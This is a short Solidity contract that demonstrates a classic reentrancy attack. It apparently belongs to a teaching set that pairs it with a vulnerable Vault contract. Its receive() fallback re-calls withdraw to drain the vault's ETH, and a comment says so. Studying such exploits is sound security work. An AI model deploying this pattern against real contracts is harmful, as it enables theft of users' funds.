// SPDX-License-Identifier: MIT

pragma solidity 0.8.25;

import "./classicReentrancy.sol";

contract classicReentrancyAttack {
    Vault vault;

    constructor(address _vaultAddress) {
        vault = Vault(_vaultAddress);
    }

    function deposit() external payable {
        vault.deposit{value: msg.value}();
    }

    function withdraw() external {
        uint256 balance = vault.balanceOf(address(this));
        vault.withdraw(balance);
    }

    receive() external payable {
        uint256 balance = vault.balanceOf(address(this));
        //If an attacker re-enters the withdraw function, they will steal all the ETH from the contract.
        try vault.withdraw(balance) {} catch {}
    }
}
